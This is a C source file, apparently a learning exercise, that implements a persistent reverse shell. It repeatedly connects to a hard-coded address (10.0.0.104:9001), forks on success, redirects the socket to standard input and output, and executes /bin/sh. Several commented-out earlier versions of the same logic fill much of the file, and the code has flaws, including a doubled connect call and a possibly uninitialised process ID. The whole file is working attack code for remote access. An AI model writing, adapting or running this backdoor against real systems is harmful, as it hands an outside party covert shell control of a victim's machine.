#include <stdio.h> 
#include <unistd.h>

#include <netinet/in.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "10.0.0.104"
#define REMOTE_PORT 9001

int main(int argc, char *argv[])
{

	pid_t pid; //process ID

// struct sockaddr_in sa;
// int s;

// sa.sin_family = AF_INET;
// sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
// sa.sin_port = htons(REMOTE_PORT);

// s = socket(AF_INET, SOCK_STREAM,0);
	while(true)
	{
		//create a new socket every time
		struct sockaddr_in sa;
		int s;

		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
		sa.sin_port = htons(REMOTE_PORT);
		s = socket(AF_INET, SOCK_STREAM,0);
		
		//attempt to connect
		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)) //connection fails
		{
			printf("Connect fail\n");
			close(s);
			continue;
		}

		// else //connect didnt fail we fork
		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa)) >= 0)) //connection success
			{ 
				pid = fork(); 
			}


		if (pid == 0) //we are in child process
			{
				//exec a shell
				dup2(s,0);
				dup2(s,1);
				dup2(s,2);

				execve("/bin/sh", 0, 0);
			}
		
		if (pid > 0 ) //we are in parent process
			{
				continue;
			}

		// 	dup2(s,0);
		// 	dup2(s,1);
		// 	dup2(s,2);

		// 	execve("/bin/sh", 0, 0);
		// }


		// if (pid == 0) //we are in child process
		// {
		// 	/* code */
		// }
		
		// if (pid > 0 ) //we are in parent process
		// {

		// }

		// // struct sockaddr_in sa;
		// // int s;

		// // sa.sin_family = AF_INET;
		// // sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
		// // sa.sin_port = htons(REMOTE_PORT);
		// // s = socket(AF_INET, SOCK_STREAM,0);
		
		// if ((connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0))
		// {
		// 	printf("Connect fail\n");
		// 	close(s);
		// 	continue;
		// }
		// else{
		// 	dup2(s,0);
		// 	dup2(s,1);
		// 	dup2(s,2);

		// 	execve("/bin/sh", 0, 0);
		// }
	}
// dup2(s,0);
// dup2(s,1);
// dup2(s,2);

// execve("/bin/sh", 0, 0);

return 0;
}
